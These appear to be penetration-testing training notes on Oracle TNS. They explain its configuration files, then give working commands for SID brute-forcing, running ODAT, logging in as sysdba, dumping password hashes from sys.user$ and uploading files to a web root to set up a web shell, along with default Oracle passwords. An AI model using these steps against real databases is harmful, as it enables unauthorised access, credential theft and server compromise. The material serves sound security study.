The Oracle Transparent Network Substrate (Oracle TNS) server facilitates communication between Oracle databases and applications over networks. It supports various network protocols, such as IPX/SPX and TCP/IP protocol stacks. This is a preferred solution in the healthcare, finance and retail industries. It has a built-in encryption mechanism.

Overtime TNS has been updated to support newer technologies like IPv6 and SSL/TLS, which makes it more suitable for the following purposes:

|   |   |   |   |
|---|---|---|---|
|Name resolution|Connection management|Load balancing|Security|

It offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.

## Default Configuration

TNS runs on port TCP/1521 by default, The listener can also support multiple interfaces, Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g.

The listener will use authentication based on hostnames, IP addresses, usernames and passwords. The listener will use Oracle Net Services to encrypt communication. The configuration files are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin`. The plain text file contains configuration information for the Oracle database instances and other network services use the TNS protocol.

Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There are many changes made to the default installation, for example Oracle 9 a default password `CHANGE_ON_INSTALL`, while Oracle 10 didn't, the Oracle DBSNMP service also uses default password `dbsnmp`. If organizations use `finger` with Oracle it can put Oracle's service at risk.

Each database or service as a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information to connect to the service. The entry consists of service name, network location, and database or service name that clients should use to connect to the service.

### Tnsnames.ora File Example
```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

The entries can also include additional information like authentication details, connection pooling settings, and load balancing configurations.

The `listener.ora` file defines the listener process's properties and parameters, it's responsible for receiving client requests and forwarding them to the appropriate database instance.

### Listener.ora File Example
```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

In short, the client side Oracle Net Services uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses `listener.ora` to determine the services it should listen to and the behavior of the listener.

The Oracle databases can be protected by creating PL/SQL Exclusion List (PlsqlExclusionList) and place it in the `$ORACLE_HOME/sqldeveloper` directory, it contains the names of PL/SQL packages or types that should be excluded from execution. After created it can be loaded into the database instance.

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|

To enumerate the TNS listener and interact with it we need to download a few packages and scripts.

### Oracle-Tools-Setup.sh
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien python3-pip -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

### Testing ODAT
```shell-session
$ ./odat.py -h
```

Oracle Database Attacking Tool (ODAT), is open source tool written in python, used to enumerate and exploit vulnerabilities in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

### Nmap
```shell-session
$ sudo nmap -p1521 -sV <ip address> --open
```

In Oracle RDBMS, a system identifier (SID) is a unique name that identifies a particular database instance. An instance is a set of processes and memory structures that interact to manage the database's data, when a client connects to an Oracle database it specifies the database's SID along with its connection string, the default value is defined in the `tnsnames.ora` file.

Administrators can use SIDs to start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.

### Nmap - SID Bruteforcing
```shell-session
$ sudo nmap -p1521 -sV <ip address> --open --script oracle-sid-brute
```

`odat.py` can be used to retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfiguration, etc.

### Run ODAT With All Modules
```shell-session
$ ./odat.py all -s <ip address>
```

### SQLplus - Log in to the Database
```shell-session
$ sqlplus <username>/<password>@<ip address>/<sid>
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```shell-session
$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

### Oracle RDBMS - Interaction
```shell-session
SQL> select table_name from all_tables; # Show all available tables in the current database

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs; # Show the prvileges of the current user

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Even if the user doesn't have administrator privileges we can try to log in as the System Database Admin (sysdba), giving us higher privileges.

### Oracle RDBMS - Database Enumeration
```shell-session
Wildland4958@htb[/htb]$ sqlplus <username>/<password>@<ip address>/<sid> as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

We cannot add new users or make any modifications from here.

### Oracle RDBMS - Extract Password Hashes
```shell-session
SQL> select name, password from sys.user$;
```

If the server runs a web server we can try uploading a web shell to the root directory.

|**OS**|**Default Path** |
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

### Oracle RDBMS - File Upload
```shell-session
$ echo "Oracle File Upload Test" > testing.txt
$ ./odat.py utlfile -s <ip address> -d <sid> -U <username> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

```shell-session
$ curl -X GET http://10.129.204.235/testing.txt
```